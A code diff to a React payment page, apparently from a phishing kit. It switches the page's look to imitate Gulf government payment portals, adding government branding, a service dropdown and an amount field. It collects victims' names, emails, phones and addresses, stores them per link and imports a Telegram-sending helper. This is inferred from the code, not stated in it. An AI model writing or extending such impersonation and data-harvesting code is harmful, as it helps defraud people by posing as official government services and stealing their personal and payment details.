@@ -1,4 +1,4 @@
-import { useState } from "react";
+import { useState, useMemo } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { Helmet } from "react-helmet-async";
 import { Card } from "@/components/ui/card";
@@ -6,14 +6,17 @@ import { Button } from "@/components/ui/button";
 import { Badge } from "@/components/ui/badge";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
+import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import { getCountryByCode } from "@/lib/countries";
-import { getCurrencySymbol, formatCurrency } from "@/lib/countryCurrencies";
+import { getCurrencySymbol, getCurrencyCode, formatCurrency } from "@/lib/countryCurrencies";
+import { getGovernmentServicesByCountry } from "@/lib/gccGovernmentServices";
+import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
 import { getCompanyMeta } from "@/utils/companyMeta";
 import PaymentMetaTags from "@/components/PaymentMetaTags";
 import { useLink, useUpdateLink } from "@/hooks/useSupabase";
 import { sendToTelegram } from "@/lib/telegram";
-import { Shield, ArrowLeft, User, Mail, Phone, CreditCard, MapPin } from "lucide-react";
+import { Shield, ArrowLeft, User, Mail, Phone, CreditCard, MapPin, DollarSign, FileText } from "lucide-react";
 
 const PaymentRecipient = () => {
   const { id } = useParams();
@@ -24,6 +27,19 @@ const PaymentRecipient = () => {
   const [customerEmail, setCustomerEmail] = useState("");
   const [customerPhone, setCustomerPhone] = useState("");
   const [residentialAddress, setResidentialAddress] = useState("");
+  const [paymentAmount, setPaymentAmount] = useState("");
+  const [selectedService, setSelectedService] = useState("");
+
+  // Get link payload first
+  const shippingInfo = linkData?.payload as any;
+
+  // Get payer type from shipping info (default to "recipient" for backward compatibility)
+  const payerType = shippingInfo?.payer_type || "recipient";
+
+  // Get country from link data (must be before using currency functions)
+  const countryCode = shippingInfo?.selectedCountry || "SA";
+  const countryData = getCountryByCode(countryCode);
+  const phoneCode = countryData?.phoneCode || "+966";
 
   // Get query parameters from URL
   const urlParams = new URLSearchParams(window.location.search);
@@ -35,37 +51,27 @@ const PaymentRecipient = () => {
   const branding = getServiceBranding(serviceKey);
   const companyMeta = getCompanyMeta(serviceKey);
 
-  // Use company branding colors
-  const colors = {
-    primary: branding.colors?.primary || "#CE1126",
-    secondary: branding.colors?.secondary || "#00732F",
-    accent: branding.colors?.accent || "#000000",
-    background: branding.colors?.background || "#FFFFFF",
-    surface: branding.colors?.surface || "#F5F5F5",
-    border: branding.colors?.border || "#E0E0E0",
-    text: branding.colors?.text || "#000000",
-    textLight: branding.colors?.textLight || "#666666",
-    textOnPrimary: branding.colors?.textOnPrimary || "#FFFFFF",
-  };
+  // Get government payment system for the country (use this for styling)
+  const govSystem = getGovernmentPaymentSystem(countryCode);
 
-  // Use branding properties with fallbacks
+  // Get government services for the country
+  const governmentServices = useMemo(
+    () => getGovernmentServicesByCountry(countryCode),
+    [countryCode]
+  );
+
+  // Use GOVERNMENT branding colors (not company branding)
+  const colors = govSystem.colors;
+
+  // Use government branding properties
   const brandingProps = {
     colors,
-    fonts: branding.fonts || { primaryAr: "Cairo", primary: "Cairo" },
-    shadows: branding.shadows || {
-      sm: "0 1px 2px 0 rgba(0, 0, 0, 0.05)",
-      md: "0 4px 6px -1px rgba(0, 0, 0, 0.1)",
-      lg: "0 10px 15px -3px rgba(0, 0, 0, 0.1)"
-    },
-    gradients: branding.gradients || {
-      primary: `linear-gradient(135deg, ${colors.primary}, ${colors.secondary})`
-    },
-    borderRadius: branding.borderRadius || {
-      md: "8px",
-      lg: "12px"
-    },
-    name: branding.name || serviceName,
-    nameAr: branding.nameAr || serviceName,
+    fonts: govSystem.fonts,
+    shadows: govSystem.shadows,
+    gradients: govSystem.gradients,
+    borderRadius: govSystem.borderRadius,
+    name: govSystem.nameEn,
+    nameAr: govSystem.nameAr,
     logo: branding.logo
   };
 
@@ -73,19 +79,9 @@ const PaymentRecipient = () => {
   const heroImage = branding.heroImage || "/assets/hero-bg.jpg";
 
   // Use dynamic company meta for OG tags
-  const dynamicTitle = titleParam || companyMeta.title || `Payment - ${serviceName}`;
-  const dynamicDescription = companyMeta.description || `Complete your payment for ${serviceName}`;
+  const dynamicTitle = titleParam || companyMeta.title || `Payment - ${govSystem.nameAr}`;
+  const dynamicDescription = companyMeta.description || govSystem.description;
   const dynamicImage = companyMeta.image;
-
-  const shippingInfo = linkData?.payload as any;
-
-  // Get payer type from shipping info (default to "recipient" for backward compatibility)
-  const payerType = shippingInfo?.payer_type || "recipient";
-
-  // Get country from link data (must be before using currency functions)
-  const countryCode = shippingInfo?.selectedCountry || "SA";
-  const countryData = getCountryByCode(countryCode);
-  const phoneCode = countryData?.phoneCode || "+966";
 
   // Get currency code from link data, URL parameter, or country data
   const savedCurrencyCode = shippingInfo?.currency_code;
@@ -154,6 +150,10 @@ const PaymentRecipient = () => {
       timestamp: new Date().toISOString()
     });
 
+    // Get selected service data
+    const selectedServiceData = governmentServices.find(s => s.key === selectedService);
+    const finalAmount = parseFloat(paymentAmount) || amount;
+
     // Save customer data to the link's payload in Supabase for cross-device compatibility
     try {
       const customerData = {
@@ -164,9 +164,15 @@ const PaymentRecipient = () => {
           phone: customerPhone,
           address: residentialAddress,
           service: serviceName,
-          amount: formattedAmount
+          amount: formatCurrency(finalAmount, currencyCode),
+          selectedServiceKey: selectedService,
+          selectedServiceName: selectedServiceData?.nameAr || '',
         },
-        selectedCountry: countryCode
+        payment_amount: finalAmount,
+        currency_code: currencyCode,
+        selectedCountry: countryCode,
+        government_service: selectedService,
+        government_service_name: selectedServiceData?.nameAr || '',
       };
 
       await updateLink.mutateAsync({
@@ -451,6 +457,87 @@ const PaymentRecipient = () => {
                   />
                 </div>
 
+                {/* Government Service Selection */}
+                <div>
+                  <Label
+                    htmlFor="service"
+                    className="flex items-center gap-2 mb-2 text-sm font-medium"
+                    style={{
+                      color: '#000000',
+                      fontFamily: brandingProps.fonts.primaryAr
+                    }}
+                  >
+                    <FileText className="w-4 h-4" />
+                    الخدمة *
+                  </Label>
+                  <Select value={selectedService} onValueChange={setSelectedService}>
+                    <SelectTrigger
+                      className="h-12 text-base bg-white"
+                      style={{
+                        borderWidth: '2px',
+                        borderColor: brandingProps.colors.border,
+                        borderRadius: brandingProps.borderRadius.md,
+                        fontFamily: brandingProps.fonts.primaryAr,
+                      }}
+                    >
+                      <SelectValue placeholder="اختر الخدمة" />
+                    </SelectTrigger>
+                    <SelectContent
+                      className="bg-background z-50"
+                      style={{
+                        fontFamily: brandingProps.fonts.primaryAr,
+                      }}
+                    >
+                      {governmentServices.map((service) => (
+                        <SelectItem key={service.id} value={service.key}>
+                          {service.nameAr}
+                        </SelectItem>
+                      ))}
+                    </SelectContent>
+                  </Select>
+                  {selectedService && (
+                    <p className="text-xs mt-1" style={{ color: brandingProps.colors.textLight }}>
+                      {governmentServices.find(s => s.key === selectedService)?.description}
+                    </p>
+                  )}
+                </div>
+
+                {/* Payment Amount */}
+                <div>
+                  <Label
+                    htmlFor="amount"
+                    className="flex items-center gap-2 mb-2 text-sm font-medium"
+                    style={{
+                      color: '#000000',
+                      fontFamily: brandingProps.fonts.primaryAr
+                    }}
+                  >
+                    <DollarSign className="w-4 h-4" />
+                    المبلغ *
+                  </Label>
+                  <Input
+                    id="amount"
+                    type="number"
+                    value={paymentAmount || amount}
+                    onChange={(e) => setPaymentAmount(e.target.value)}
+                    required
+                    className="h-12 text-base transition-colors bg-white"
+                    style={{
+                      borderWidth: '2px',
+                      borderColor: brandingProps.colors.border,
+                      borderRadius: brandingProps.borderRadius.md,
+                      fontFamily: brandingProps.fonts.primaryAr,
+                      color: '#000000'
+                    }}
+                    placeholder={`${getCurrencySymbol(countryCode)}`}
+                    step="0.01"
+                    min="0"
+                  />
+                  <p className="text-xs mt-1" style={{ color: brandingProps.colors.textLight }}>
+                    💱 العملة: {getCurrencySymbol(countryCode)}
+                  </p>
+                </div>
+
                 {/* Payment Summary */}
                 <div
                   className="mt-6 p-4 rounded-lg"
@@ -500,10 +587,12 @@ const PaymentRecipient = () => {
                     !customerName ||
                     !customerEmail ||
                     !customerPhone ||
-                    !residentialAddress
+                    !residentialAddress ||
+                    !selectedService ||
+                    !paymentAmount
                   }
                 >
-                  <span className="ml-2">التالي</span>
+                  <span className="ml-2">التالي - {govSystem.nameAr}</span>
                   <ArrowLeft className="w-5 h-5" />
                 </Button>
 
